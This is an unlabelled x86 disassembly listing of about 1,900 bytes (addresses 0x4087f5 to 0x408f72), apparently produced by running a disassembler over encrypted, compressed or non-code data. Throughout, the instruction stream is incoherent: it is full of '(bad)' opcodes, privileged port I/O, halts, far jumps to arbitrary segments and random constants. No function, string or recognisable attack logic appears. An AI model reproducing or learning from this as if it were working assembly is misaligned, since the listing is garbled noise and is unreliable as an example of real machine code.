  4087f5:	ins    BYTE PTR es:[edi],dx
  4087f6:	(bad)  
  4087f7:	aaa    
  4087f8:	mov    dh,0xd7
  4087fa:	jl     0x40882d
  4087fc:	test   al,0x82
  4087fe:	mov    edx,0x930d2eb
  408803:	adc    eax,eax
  408805:	dec    esp
  408806:	sub    bl,BYTE PTR [eax+0x579fcc99]
  40880c:	rol    dl,0x85
  40880f:	stos   BYTE PTR es:[edi],al
  408810:	leave  
  408811:	mov    ah,BYTE PTR [eax]
  408813:	or     bl,ch
  408815:	mov    WORD PTR [eax],ss
  408817:	xchg   edx,eax
  408818:	rcl    BYTE PTR [ebp+0x2e],1
  40881b:	cwde   
  40881c:	mov    ecx,0x70b2aab5
  408821:	iret   
  408822:	adc    eax,0x17d9b2c2
  408827:	pop    ss
  408828:	loope  0x40888b
  40882a:	add    al,cl
  40882c:	xchg   ebx,eax
  40882d:	push   eax
  40882e:	xchg   edx,eax
  40882f:	mov    BYTE PTR [ecx-0x7e557bdd],al
  408835:	add    edx,DWORD PTR [ecx]
  408837:	pop    edi
  408838:	test   BYTE PTR [esi+ebp*2+0x2f],0x6c
  40883d:	mov    bh,0x97
  40883f:	hlt    
  408840:	jb     0x408883
  408842:	mov    es,WORD PTR [ebx+0x5d7621b7]
  408848:	add    BYTE PTR [esi-0x57],bl
  40884b:	popa   
  40884c:	test   eax,0x75641fb7
  408851:	pop    ebx
  408852:	cmp    al,0xd8
  408854:	xchg   edx,eax
  408855:	pushf  
  408856:	sbb    BYTE PTR [edx-0x20],bh
  408859:	fild   QWORD PTR [edx-0x4b033a40]
  40885f:	shl    DWORD PTR [edx],1
  408861:	sbb    DWORD PTR [ebx-0xb],esi
  408864:	and    DWORD PTR ds:0x7ca342f2,edi
  40886a:	mov    ds:0x83cce532,eax
  40886f:	cwde   
  408870:	xor    DWORD PTR cs:[eax-0x6be6251e],0x14
  408878:	xchg   esi,eax
  408879:	lods   eax,DWORD PTR ds:[esi]
  40887a:	repz sar BYTE PTR [eax],cl
  40887d:	pop    ecx
  40887e:	mov    bl,0x9b
  408880:	mov    eax,ds:0x9c00c168
  408885:	shr    BYTE PTR [esi+0x3e],cl
  408888:	bound  ebx,QWORD PTR [ebx+edi*4-0x37]
  40888c:	push   es
  40888d:	xlat   BYTE PTR ds:[ebx]
  40888e:	mov    al,0x44
  408890:	mov    cl,0xb6
  408892:	hlt    
  408893:	cdq    
  408894:	nop
  408895:	aad    0xc2
  408897:	gs push edi
  408899:	dec    ebp
  40889a:	int    0xe4
  40889c:	aas    
  40889d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40889e:	inc    edx
  40889f:	jo     0x4088c0
  4088a1:	ficom  WORD PTR [esi+0x36]
  4088a4:	dec    edi
  4088a5:	mov    al,bh
  4088a7:	xchg   ebx,eax
  4088a8:	je     0x40884b
  4088aa:	mov    ds:0xc2095483,al
  4088af:	xchg   esi,eax
  4088b0:	out    0x9c,al
  4088b2:	mov    bl,0x15
  4088b4:	pop    ss
  4088b5:	pop    edx
  4088b6:	mov    eax,DWORD PTR gs:[edx-0x80]
  4088ba:	ret    
  4088bb:	(bad)  
  4088bc:	enter  0x2b58,0xaa
  4088c0:	ins    BYTE PTR es:[edi],dx
  4088c1:	sub    DWORD PTR [ebp+edi*1+0x370bcfb8],ebx
  4088c8:	lds    esp,FWORD PTR [esi+esi*4]
  4088cb:	add    cl,BYTE PTR [ecx+0x7fed62db]
  4088d1:	out    dx,al
  4088d2:	call   0xb6f1:0xaceb34a2
  4088d9:	push   edx
  4088da:	sub    al,0x3b
  4088dc:	in     eax,0xd8
  4088de:	pop    esi
  4088df:	push   eax
  4088e0:	retf   
  4088e1:	mov    dl,0x77
  4088e3:	jmp    0xf6cb:0x6e5f2b43
  4088ea:	or     bl,BYTE PTR [ecx+0x39ab1324]
  4088f0:	fstp   TBYTE PTR [eax]
  4088f2:	jmp    0xfcabe698
  4088f7:	mov    ebp,0xe5c4daea
  4088fc:	mov    edx,0x7c6c7647
  408901:	aad    0xe
  408903:	in     eax,dx
  408904:	rol    DWORD PTR [eax],0x46
  408907:	stc    
  408908:	jecxz  0x408915
  40890a:	mov    edi,0x305fda2f
  40890f:	dec    ebx
  408910:	jl     0x408928
  408912:	in     al,dx
  408913:	pop    ebp
  408914:	xchg   esp,eax
  408915:	test   eax,0x715fbe72
  40891a:	sub    eax,0xea571dfd
  40891f:	in     al,0x39
  408921:	icebp  
  408922:	clc    
  408923:	popa   
  408924:	ss sar BYTE PTR gs:[ebx],cl
  408928:	lahf   
  408929:	ins    BYTE PTR es:[edi],dx
  40892a:	push   ebx
  40892b:	cmp    ecx,DWORD PTR [esi]
  40892d:	out    dx,eax
  40892e:	pop    ss
  40892f:	pop    es
  408930:	xor    BYTE PTR [esp+edi*8-0x3],bl
  408934:	and    BYTE PTR [esi+edx*2-0x5],0x18
  408939:	sub    eax,0xe8ba781b
  40893e:	cwde   
  40893f:	les    esi,FWORD PTR [edx]
  408941:	cld    
  408942:	scas   eax,DWORD PTR es:[edi]
  408943:	cmp    edi,DWORD PTR [edi]
  408945:	cmp    dh,BYTE PTR [esi+0x60f5f555]
  40894b:	inc    ebx
  40894c:	pop    ecx
  40894d:	mov    eax,ds:0x847f5ca3
  408952:	shr    DWORD PTR [ebp-0x73],0xdf
  408956:	lahf   
  408957:	dec    edx
  408958:	das    
  408959:	adc    DWORD PTR [ebx],ebx
  40895b:	in     al,0x1c
  40895d:	popf   
  40895e:	int    0x40
  408960:	mov    es:0x9abe45a0,al
  408966:	xchg   ecx,eax
  408967:	inc    esp
  408968:	mov    ?,WORD PTR [eax+eiz*2-0x37]
  40896c:	outs   dx,BYTE PTR ds:[esi]
  40896d:	xchg   ecx,eax
  40896e:	mov    ebp,0x8cf47f8d
  408973:	xor    DWORD PTR [esi],ebx
  408975:	fisttp WORD PTR [eax]
  408977:	outs   dx,BYTE PTR ds:[esi]
  408978:	(bad)  
  408979:	stos   DWORD PTR es:[edi],eax
  40897a:	cmp    dh,BYTE PTR [edi+esi*4]
  40897d:	fs push eax
  40897f:	lea    ebp,[edx-0xa]
  408982:	mov    ch,0xb
  408984:	jge    0x408974
  408986:	xchg   ebp,eax
  408987:	add    DWORD PTR [edi+0x3a],esi
  40898a:	pop    ebx
  40898b:	ins    BYTE PTR es:[edi],dx
  40898c:	push   edi
  40898d:	sysenter 
  40898f:	and    ebx,DWORD PTR [ecx-0x1e74304c]
  408995:	xor    eax,0x38dd34c2
  40899a:	ss sti 
  40899c:	pusha  
  40899d:	push   esi
  40899e:	mov    WORD PTR [edx+0x1213e6f],cs
  4089a4:	fs cli 
  4089a6:	push   esi
  4089a7:	push   0x35bbef98
  4089ac:	or     BYTE PTR [edx],dh
  4089ae:	xchg   ebp,eax
  4089af:	aas    
  4089b0:	les    esi,FWORD PTR [ebx-0x65d1cf52]
  4089b6:	ss inc esi
  4089b8:	inc    eax
  4089b9:	sbb    eax,0xf68a14db
  4089be:	gs jbe 0x4089c4
  4089c1:	scas   al,BYTE PTR es:[edi]
  4089c2:	(bad)  
  4089c3:	in     al,dx
  4089c4:	addr16 adc bl,cl
  4089c7:	adc    ecx,DWORD PTR [eax+0x78]
  4089ca:	neg    BYTE PTR [ebx]
  4089cc:	and    BYTE PTR [ecx],al
  4089ce:	add    BYTE PTR [eax+0x7f],dl
  4089d1:	sbb    BYTE PTR ds:0x5bf5fe0d,ah
  4089d7:	dec    esp
  4089d8:	sub    eax,0x37cab7d0
  4089dd:	dec    ebx
  4089de:	pop    eax
  4089df:	sti    
  4089e0:	ret    0x9a99
  4089e3:	stos   DWORD PTR es:[edi],eax
  4089e4:	fstp   TBYTE PTR [eax-0x10]
  4089e7:	push   es
  4089e8:	sbb    cl,al
  4089ea:	jl     0x40896f
  4089ec:	cli    
  4089ed:	jne    0x408992
  4089ef:	lods   al,BYTE PTR ds:[esi]
  4089f0:	ins    BYTE PTR es:[edi],dx
  4089f1:	mov    ah,0x6b
  4089f3:	test   DWORD PTR ds:0x9b3a282a,edi
  4089f9:	or     cl,cl
  4089fb:	fcom   QWORD PTR [ecx+0x7c]
  4089fe:	bound  edx,QWORD PTR [edi]
  408a00:	iret   
  408a01:	stos   DWORD PTR es:[edi],eax
  408a02:	and    eax,DWORD PTR [ebp+0x10]
  408a05:	iret   
  408a06:	inc    esi
  408a07:	mov    ebp,0xc2aed6ec
  408a0c:	in     al,0x6a
  408a0e:	leave  
  408a0f:	pop    ebp
  408a10:	lods   al,BYTE PTR ds:[esi]
  408a11:	mov    dl,0x9c
  408a13:	jge    0x408a80
  408a15:	adc    eax,0x3c719865
  408a1a:	into   
  408a1b:	push   es
  408a1c:	stos   BYTE PTR es:[edi],al
  408a1d:	and    ch,BYTE PTR [ecx-0x49689298]
  408a23:	test   eax,0x219d94de
  408a28:	dec    edi
  408a29:	mov    dh,0xb9
  408a2b:	(bad)  
  408a2c:	mov    eax,0xb0ded99
  408a31:	xor    DWORD PTR [edi+eax*2-0x2854a289],0x9db01085
  408a3c:	icebp  
  408a3d:	call   0x7b3c:0xa4508403
  408a44:	rcl    BYTE PTR [ecx],0x7a
  408a47:	pop    ebp
  408a48:	push   ds
  408a49:	loop   0x408a96
  408a4b:	push   ebp
  408a4c:	jge    0x408a38
  408a4e:	enter  0x6cac,0x68
  408a52:	ins    DWORD PTR es:[edi],dx
  408a53:	in     al,0x61
  408a55:	test   bh,bl
  408a57:	fs ins BYTE PTR es:[edi],dx
  408a59:	jno    0x408ac7
  408a5b:	xchg   esp,eax
  408a5c:	cld    
  408a5d:	or     DWORD PTR [esi+0x75fe7e3b],eax
  408a63:	adc    dl,BYTE PTR [eax+eax*4-0x1c]
  408a67:	pop    edx
  408a68:	mov    BYTE PTR [ebx],dl
  408a6a:	xchg   ebx,eax
  408a6b:	inc    esi
  408a6c:	inc    ebp
  408a6d:	jge    0x408a15
  408a6f:	cmc    
  408a70:	fwait
  408a71:	mov    bl,0xa3
  408a73:	sbb    BYTE PTR [edi],0x70
  408a76:	xchg   BYTE PTR [eax],cl
  408a78:	aam    0xb7
  408a7a:	mov    al,ds:0xe993d28e
  408a7f:	xchg   BYTE PTR [eax+0x6f],bh
  408a82:	push   ecx
  408a83:	xchg   ecx,eax
  408a84:	add    BYTE PTR [edx],cl
  408a86:	mov    esi,0xe9f9bcaf
  408a8b:	in     al,0xf2
  408a8d:	mov    eax,ds:0x1c288d4e
  408a92:	aas    
  408a93:	adc    eax,0x63d28fef
  408a98:	push   edx
  408a99:	cmp    edi,DWORD PTR [edi+0x198daa32]
  408a9f:	jge    0x408ac2
  408aa1:	pushf  
  408aa2:	shl    BYTE PTR [ebx],cl
  408aa4:	pop    ss
  408aa5:	mov    bh,0xf7
  408aa7:	xor    al,BYTE PTR [ebx]
  408aa9:	jmp    0xb850ec76
  408aae:	mov    cl,0x21
  408ab0:	mov    DWORD PTR [ebp+0x6d],edi
  408ab3:	xor    ebx,DWORD PTR [esi+0xe]
  408ab6:	retf   
  408ab7:	or     ebx,edx
  408ab9:	xor    bh,dh
  408abb:	jmp    0x6eae:0x63a7bed9
  408ac2:	cdq    
  408ac3:	(bad)  
  408ac4:	xor    edx,esi
  408ac6:	mov    al,bh
  408ac8:	scas   al,BYTE PTR es:[edi]
  408ac9:	push   ds
  408aca:	das    
  408acb:	lea    edx,[esi-0x7f]
  408ace:	ja     0x408b27
  408ad0:	pop    ebx
  408ad1:	imul   dl
  408ad3:	out    0x5b,al
  408ad5:	call   0x2c3:0xf67b60dc
  408adc:	out    0xf3,al
  408ade:	addr16 int 0x4c
  408ae1:	fistp  DWORD PTR [ebp+0x76400b1b]
  408ae7:	mov    dl,0x85
  408ae9:	sti    
  408aea:	inc    ebp
  408aeb:	in     al,dx
  408aec:	jl     0x408b62
  408aee:	aas    
  408aef:	and    edi,ebx
  408af1:	ds (bad) 
  408af3:	(bad)  
  408af4:	iret   
  408af5:	iret   
  408af6:	push   ds
  408af7:	data16 add BYTE PTR [ebp-0x34],bh
  408afb:	inc    edx
  408afc:	icebp  
  408afd:	shl    DWORD PTR [ebx+edi*4],1
  408b00:	jp     0x408b17
  408b02:	test   DWORD PTR [ebx+0x4b490a91],ebx
  408b08:	pop    es
  408b09:	cdq    
  408b0a:	xor    esp,DWORD PTR [ecx+ebp*2-0x689ca31c]
  408b11:	sub    al,0x95
  408b13:	mov    gs,WORD PTR [ebx+0x2c]
  408b16:	sub    cl,ch
  408b18:	mov    ebp,0xf534aba9
  408b1d:	pushf  
  408b1e:	pop    esi
  408b1f:	cmp    al,0x20
  408b21:	sub    ch,BYTE PTR [edx-0x6f]
  408b24:	scas   eax,DWORD PTR es:[edi]
  408b25:	xor    dl,bl
  408b27:	call   0x5ef0:0x36d9a5b
  408b2e:	sbb    BYTE PTR [edx],dl
  408b30:	leave  
  408b31:	sbb    eax,0x75982f00
  408b36:	pop    esp
  408b37:	pop    esp
  408b38:	lea    ebx,[esi]
  408b3a:	and    bh,bh
  408b3c:	jae    0x408bb7
  408b3e:	and    DWORD PTR [esi+0xeb972b1],edx
  408b44:	repz or eax,0xb9187f14
  408b4a:	xrelease xchg BYTE PTR [ebx],bh
  408b4d:	imul   ecx,DWORD PTR [edx+ebp*8+0x2c2e2c70],0xffffff9c
  408b55:	pop    edx
  408b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b57:	inc    ebx
  408b58:	sub    esi,eax
  408b5a:	pop    es
  408b5b:	xchg   esp,eax
  408b5c:	scas   al,BYTE PTR es:[edi]
  408b5d:	jae    0x408b6d
  408b5f:	out    0x42,al
  408b61:	sar    DWORD PTR [ebx-0xdfeaae9],1
  408b67:	pop    edi
  408b68:	ins    BYTE PTR es:[edi],dx
  408b69:	push   cs
  408b6a:	xchg   edx,eax
  408b6b:	std    
  408b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6d:	and    DWORD PTR [esi-0x16],esi
  408b70:	or     BYTE PTR [esi-0x50],cl
  408b73:	loopne 0x408b2a
  408b75:	jo     0x408b42
  408b77:	es mov ah,0xe7
  408b7a:	jge    0x408b84
  408b7c:	jnp    0x408bee
  408b7e:	pop    esi
  408b7f:	clc    
  408b80:	add    BYTE PTR fs:[eax],0x4
  408b84:	test   BYTE PTR [eax+0x48],dl
  408b87:	inc    esp
  408b88:	fst    st(3)
  408b8a:	inc    ebx
  408b8b:	dec    esi
  408b8c:	(bad)
  408b8f:	div    DWORD PTR [ecx]
  408b91:	inc    edx
  408b92:	mov    ebp,edx
  408b94:	jmp    0xe5a7937b
  408b99:	push   ebx
  408b9a:	rcl    BYTE PTR [edi-0x5185d191],0xbf
  408ba1:	outs   dx,BYTE PTR ds:[esi]
  408ba2:	scas   eax,DWORD PTR es:[edi]
  408ba3:	mov    ebp,0x4984f652
  408ba8:	hlt    
  408ba9:	jo     0x408c1f
  408bab:	adc    al,0xac
  408bad:	imul   ecx,DWORD PTR [edi],0xffffffb9
  408bb0:	shl    BYTE PTR [esp+esi*8],0xa5
  408bb4:	icebp  
  408bb5:	bound  ebx,QWORD PTR [esi-0x19]
  408bb8:	mov    ebx,0xb97a0a33
  408bbd:	jb     0x408bf0
  408bbf:	adc    ebx,DWORD PTR [ebx+0x7c]
  408bc2:	add    bl,BYTE PTR [ebp+0x26]
  408bc5:	fstp   DWORD PTR [ebx]
  408bc7:	popf   
  408bc8:	retf   
  408bc9:	(bad)  
  408bca:	pop    ecx
  408bcb:	dec    edi
  408bcc:	ds jmp 0x3251:0xc03dad76
  408bd4:	mov    al,0xab
  408bd6:	cli    
  408bd7:	call   0x73e3:0x18c0a7f
  408bde:	xor    esi,DWORD PTR [eax]
  408be0:	sbb    edi,DWORD PTR [ebx]
  408be2:	sbb    dl,BYTE PTR [esi]
  408be4:	or     BYTE PTR [eax],ch
  408be6:	cwde   
  408be7:	push   ebx
  408be8:	pop    edi
  408be9:	mov    ds:0xd492abb9,eax
  408bee:	test   al,0xef
  408bf0:	loop   0x408bcc
  408bf2:	mov    dh,0x7d
  408bf4:	push   es
  408bf5:	mov    bl,0x94
  408bf7:	jns    0x408c39
  408bf9:	jecxz  0x408b85
  408bfb:	push   es
  408bfc:	adc    dh,cl
  408bfe:	aam    0xd7
  408c00:	mov    al,0xc5
  408c02:	clc    
  408c03:	(bad)  
  408c04:	pop    esi
  408c05:	xchg   esi,eax
  408c06:	mov    eax,ds:0x810ac917
  408c0b:	stc    
  408c0c:	cmp    bl,al
  408c0e:	je     0x408c5f
  408c10:	jle    0x408c86
  408c12:	or     DWORD PTR [edx-0x38],ecx
  408c15:	rol    DWORD PTR [ebx],1
  408c17:	xchg   DWORD PTR [edx-0x4faac21d],ecx
  408c1d:	imul   ebp,edi,0x48
  408c20:	jbe    0x408c51
  408c22:	fld    TBYTE PTR es:[eax-0x7c]
  408c26:	rol    BYTE PTR [ebx],1
  408c28:	or     DWORD PTR [eax],eax
  408c2a:	rcr    DWORD PTR [edx+esi*2],0xe9
  408c2e:	dec    esp
  408c2f:	fistp  QWORD PTR [esi-0x223c811c]
  408c35:	and    eax,0x3186fb9b
  408c3a:	stos   DWORD PTR es:[edi],eax
  408c3b:	dec    esp
  408c3c:	sub    BYTE PTR [eax-0x42056f71],cl
  408c42:	mov    al,ds:0x323e6db3
  408c47:	pop    edx
  408c48:	clc    
  408c49:	(bad)  
  408c4a:	mov    al,0xae
  408c4c:	in     eax,0xca
  408c4e:	dec    eax
  408c4f:	add    BYTE PTR [ecx],cl
  408c51:	mov    eax,0xddf9b5ec
  408c56:	and    DWORD PTR [ebx+0xe1cd43d],esi
  408c5c:	mov    DWORD PTR [eax+0x76],eax
  408c5f:	push   cs
  408c60:	push   ecx
  408c61:	pop    ebp
  408c62:	mov    ds:0x6467e9fa,al
  408c67:	xor    dl,bh
  408c69:	mov    bl,0x33
  408c6b:	inc    ecx
  408c6c:	sub    bh,0x30
  408c6f:	jo     0x408c77
  408c71:	sub    eax,0x3ec4a4c8
  408c76:	mov    ebx,0x77711f37
  408c7b:	and    esi,DWORD PTR [esi-0x2]
  408c7e:	cmp    cl,BYTE PTR [esi]
  408c80:	jle    0x408cc9
  408c82:	imul   ebp,DWORD PTR [ebx+ebx*4-0x2db89ae4],0x975f4e9a
  408c8d:	stc    
  408c8e:	adc    BYTE PTR [ebp-0x55],cl
  408c91:	sbb    DWORD PTR [edx-0x8389175],0x6ea4f881
  408c9b:	mov    ch,ah
  408c9d:	cmp    bh,BYTE PTR [eax+0x4bd80d68]
  408ca3:	xor    al,0xfd
  408ca5:	fnstenv [edx-0x4699fbf]
  408cab:	ss inc eax
  408cad:	push   cs
  408cae:	pop    ebp
  408caf:	pop    ebp
  408cb0:	xchg   esi,eax
  408cb1:	mov    WORD PTR [eax],cs
  408cb3:	push   cs
  408cb4:	inc    edi
  408cb5:	mov    bh,0x11
  408cb7:	jne    0x408cef
  408cb9:	mov    edx,0x58ada3c8
  408cbe:	imul   ebx,DWORD PTR [esi-0x2d],0x1c
  408cc2:	test   BYTE PTR [ebx+0xd07ceb6],cl
  408cc8:	test   DWORD PTR [ebp+0x6c],0x6bfc911
  408ccf:	adc    ah,0xd4
  408cd2:	sbb    DWORD PTR [edx+0x30],ebp
  408cd5:	imul   eax,DWORD PTR [eax-0xf216625],0xffffff84
  408cdc:	adc    bl,BYTE PTR [esi-0x7e]
  408cdf:	data16 jnp 0x408cca
  408ce2:	pop    esi
  408ce3:	fisttp DWORD PTR ds:0x92496fb3
  408ce9:	cmp    al,0xbf
  408ceb:	xchg   esp,eax
  408cec:	pop    esi
  408ced:	clc    
  408cee:	push   eax
  408cef:	outs   dx,DWORD PTR ds:[esi]
  408cf0:	out    0x9b,eax
  408cf2:	jae    0x408ca3
  408cf4:	(bad)  
  408cf5:	pop    eax
  408cf6:	repz pop ebp
  408cf8:	dec    esi
  408cf9:	out    0xca,eax
  408cfb:	test   al,0xf0
  408cfd:	clc    
  408cfe:	xchg   edx,eax
  408cff:	cdq    
  408d00:	(bad)
  408d03:	inc    esp
  408d04:	stos   BYTE PTR es:[edi],al
  408d05:	scas   al,BYTE PTR es:[edi]
  408d06:	cs daa 
  408d08:	ja     0x408d64
  408d0a:	outs   dx,BYTE PTR ds:[esi]
  408d0b:	or     ah,BYTE PTR [ecx]
  408d0d:	jle    0x408d35
  408d0f:	arpl   WORD PTR [esi-0x510dfdfb],bx
  408d15:	push   esi
  408d16:	inc    BYTE PTR cs:[eax+0x5339dc62]
  408d1d:	out    dx,al
  408d1e:	data16 fucom st(0)
  408d21:	add    BYTE PTR [ebx+0x18],ch
  408d24:	adc    esp,DWORD PTR [eax+0x6c2a2242]
  408d2a:	and    ebp,ebx
  408d2c:	xor    eax,0x86b5b117
  408d31:	sub    DWORD PTR [edi-0x3adaad26],0xffffff9d
  408d38:	or     ebx,DWORD PTR [ecx-0x33]
  408d3b:	mov    bl,0xf
  408d3d:	dec    edx
  408d3e:	push   esi
  408d3f:	jmp    0xd67b:0x5107d3a4
  408d46:	add    dl,BYTE PTR [eax-0x23]
  408d49:	loop   0x408d7b
  408d4b:	je     0x408cdf
  408d4d:	or     BYTE PTR [eax],0xcc
  408d50:	les    esp,FWORD PTR [eax]
  408d52:	sub    al,0x48
  408d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d55:	pusha  
  408d56:	popf   
  408d57:	cmp    edi,DWORD PTR [esi]
  408d59:	retf   0x3139
  408d5c:	imul   ecx,DWORD PTR [ecx+0x446017b2],0x20
  408d63:	inc    ebp
  408d64:	cmp    al,0x59
  408d66:	arpl   WORD PTR [eax+0x5b],bp
  408d69:	adc    BYTE PTR [esi],0xcf
  408d6c:	daa    
  408d6d:	dec    esp
  408d6e:	xor    BYTE PTR [ebp-0x18],cl
  408d71:	xor    BYTE PTR [ecx+0x1e03bb1a],0x1e
  408d78:	pop    edx
  408d79:	scas   eax,DWORD PTR es:[edi]
  408d7a:	mov    BYTE PTR [edi],cl
  408d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7d:	and    edi,DWORD PTR [ecx+0x2d2b65c1]
  408d83:	test   BYTE PTR [esi],0xe3
  408d86:	inc    ebp
  408d87:	sar    BYTE PTR [edx-0x6],cl
  408d8a:	lahf   
  408d8b:	int    0xa1
  408d8d:	push   ebx
  408d8e:	pop    ebp
  408d8f:	jg     0x408de6
  408d91:	jbe    0x408d26
  408d93:	aas    
  408d94:	dec    esi
  408d95:	aad    0xd0
  408d97:	mov    ah,0x79
  408d99:	sbb    al,0x48
  408d9b:	jae    0x408dd1
  408d9d:	sbb    DWORD PTR ds:0xd0a15387,0xffffffa9
  408da4:	sbb    esi,eax
  408da6:	inc    BYTE PTR [ecx]
  408da8:	dec    eax
  408da9:	mov    ds:0xe4158524,eax
  408dae:	mov    ds:0xa0ecf206,eax
  408db3:	xchg   BYTE PTR [edx-0x10],dh
  408db6:	mov    bl,0x75
  408db8:	retf   
  408db9:	cmp    bl,bh
  408dbb:	sbb    edi,DWORD PTR [ecx-0x6a]
  408dbe:	test   eax,0x22f930b8
  408dc3:	mov    eax,ds:0x98a532f4
  408dc8:	and    edi,ebp
  408dca:	jg     0x408d7b
  408dcc:	sbb    al,0xce
  408dce:	in     al,dx
  408dcf:	shr    BYTE PTR [edx+0x6bea76ef],1
  408dd5:	sahf   
  408dd6:	adc    eax,0x798c2690
  408ddb:	pop    es
  408ddc:	sti    
  408ddd:	lahf   
  408dde:	mov    cl,dh
  408de0:	clc    
  408de1:	jge    0x408e61
  408de3:	push   ecx
  408de4:	jg     0x408d89
  408de6:	sub    BYTE PTR [esi-0x7b],ch
  408de9:	scas   al,BYTE PTR es:[edi]
  408dea:	mov    ebx,0x2620ba63
  408def:	daa    
  408df0:	jl     0x408e56
  408df2:	leave  
  408df3:	in     al,dx
  408df4:	cmp    al,0x11
  408df6:	mov    al,ds:0x7836e21f
  408dfb:	loopne 0x408e3a
  408dfd:	outs   dx,DWORD PTR ds:[esi]
  408dfe:	sub    bh,BYTE PTR [edx]
  408e00:	jmp    0x408e2c
  408e02:	call   0xc919c202
  408e07:	add    al,0xff
  408e09:	inc    edx
  408e0b:	ret    0x1772
  408e0e:	(bad)  
  408e0f:	repz push esi
  408e11:	xchg   ebx,eax
  408e12:	mov    ecx,0xb7520369
  408e17:	add    esi,DWORD PTR [edx+0x42]
  408e1a:	addr16 cli 
  408e1c:	ins    DWORD PTR es:[edi],dx
  408e1d:	sbb    BYTE PTR ds:0xcf66ed82,dl
  408e23:	repz sub ah,BYTE PTR [esi-0x5]
  408e27:	jp     0x408e9a
  408e29:	icebp  
  408e2a:	in     al,0xe6
  408e2c:	popf   
  408e2d:	or     DWORD PTR [ebp+0x2e],0xbe4e0bd2
  408e34:	rol    BYTE PTR [edx-0x12],0x82
  408e38:	popa   
  408e39:	sbb    edi,DWORD PTR [eax+ebp*4+0x589e7497]
  408e40:	jge    0x408e8f
  408e42:	sti    
  408e43:	mov    bh,0xe9
  408e45:	mov    WORD PTR [ebx-0x2277ad93],fs
  408e4b:	imul   ebx,DWORD PTR ds:0x4da15a48,0xffffffea
  408e52:	ss ja  0x408eb8
  408e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e56:	retf   
  408e57:	or     edi,ecx
  408e59:	xchg   esp,eax
  408e5a:	stos   DWORD PTR es:[edi],eax
  408e5b:	jns    0x408ed5
  408e5d:	jmp    0x408ecf
  408e5f:	or     ah,BYTE PTR [edx]
  408e61:	sub    ebp,ecx
  408e63:	clc    
  408e64:	cdq    
  408e65:	outs   dx,DWORD PTR ds:[esi]
  408e66:	mov    ss,WORD PTR [ecx-0x37]
  408e69:	add    eax,0x93a48f1b
  408e6e:	xchg   ecx,eax
  408e6f:	or     dl,BYTE PTR [esi+0x7706b92a]
  408e75:	out    0xb5,al
  408e77:	add    al,0xd3
  408e79:	popa   
  408e7a:	xor    al,0x4
  408e7c:	pop    eax
  408e7d:	jns    0x408e6f
  408e7f:	mov    ecx,0x2bdff02a
  408e84:	stos   DWORD PTR es:[edi],eax
  408e85:	cmp    DWORD PTR [edi+edx*2+0x2c],edi
  408e89:	jmp    FWORD PTR [ebp+0x677d593b]
  408e8f:	sti    
  408e90:	cld    
  408e91:	int3   
  408e92:	push   ebx
  408e93:	stc    
  408e94:	xchg   esi,eax
  408e95:	aas    
  408e96:	mov    esi,0x9925c6b3
  408e9b:	shr    BYTE PTR [edi+0x773672a6],cl
  408ea1:	mov    ebx,0xecae2752
  408ea6:	repz pop ds
  408ea8:	ins    BYTE PTR es:[edi],dx
  408ea9:	imul   esp,DWORD PTR [esi+edx*4+0x5c],0xffffffd2
  408eae:	cli    
  408eaf:	push   ds
  408eb0:	addr16 xchg edi,eax
  408eb2:	xchg   esp,eax
  408eb3:	(bad)  
  408eb4:	fcom   DWORD PTR [eax]
  408eb6:	cwde   
  408eb7:	and    eax,0x2dcf03bd
  408ebc:	imul   ebx,ecx,0xffffffba
  408ebf:	pusha  
  408ec0:	iret   
  408ec1:	test   al,0xdb
  408ec3:	cmp    eax,0xb82ddf49
  408ec8:	mov    esi,0x5bade56
  408ecd:	in     eax,dx
  408ece:	shl    bh,0x41
  408ed1:	jo     0x408f2e
  408ed3:	aad    0xe5
  408ed5:	fisub  DWORD PTR [esi]
  408ed7:	adc    cl,cl
  408ed9:	fs sub ecx,edx
  408edc:	daa    
  408edd:	mov    eax,ds:0x1c005b32
  408ee2:	ja     0x408eb9
  408ee4:	loop   0x408ed0
  408ee6:	sbb    eax,0xa607366c
  408eeb:	enter  0xcb5d,0x98
  408eef:	dec    ecx
  408ef0:	arpl   WORD PTR [edi+0x5e],sp
  408ef3:	pop    es
  408ef4:	lods   eax,DWORD PTR ds:[esi]
  408ef5:	push   ds
  408ef6:	jp     0x408f51
  408ef8:	cld    
  408ef9:	mov    ecx,0xefb94147
  408efe:	jae    0x408eeb
  408f00:	je     0x408ed1
  408f02:	shl    DWORD PTR [ebx],1
  408f04:	push   edx
  408f05:	ins    BYTE PTR es:[edi],dx
  408f06:	ror    DWORD PTR [ecx],1
  408f08:	(bad)  
  408f09:	push   0xffffffa2
  408f0b:	sbb    BYTE PTR [eax+eiz*1],al
  408f0e:	inc    edi
  408f0f:	fistp  DWORD PTR [ebx]
  408f11:	aad    0x7b
  408f13:	lods   eax,DWORD PTR ds:[esi]
  408f14:	or     al,0x1c
  408f16:	(bad)  
  408f18:	inc    DWORD PTR [edi-0x2c]
  408f1b:	xchg   edx,eax
  408f1c:	lock adc eax,0xbe8a5683
  408f22:	arpl   WORD PTR [esi+0x466ae427],si
  408f28:	rcl    BYTE PTR [di-0x23df],1
  408f2d:	sub    bh,ah
  408f2f:	iret   
  408f30:	cmc    
  408f31:	leave  
  408f32:	fistp  QWORD PTR [ebp-0x64]
  408f35:	push   es
  408f36:	jbe    0x408ef2
  408f38:	jne    0x408ee4
  408f3a:	and    DWORD PTR [esi],edx
  408f3c:	sub    DWORD PTR [ebp+edi*8+0x62313414],eax
  408f43:	popf   
  408f44:	loop   0x408f43
  408f46:	mov    dh,0x5
  408f48:	aam    0xc2
  408f4a:	hlt    
  408f4b:	les    eax,FWORD PTR [edi+0x3afd49a5]
  408f51:	nop
  408f52:	push   edx
  408f53:	rcr    BYTE PTR [ebx-0x11],cl
  408f56:	scas   al,BYTE PTR es:[edi]
  408f57:	mov    esp,0xd6587d40
  408f5c:	add    bl,ah
  408f5e:	mov    al,ds:0x77898181
  408f63:	aam    0x9e
  408f65:	jle    0x408f85
  408f67:	or     bh,dl
  408f69:	gs jae 0x408fc4
  408f6c:	outs   dx,DWORD PTR ds:[esi]
  408f6d:	jb     0x408f68
  408f6f:	xchg   DWORD PTR [esi-0xc],edx
  408f72:	mov    esp,0x80d32e30
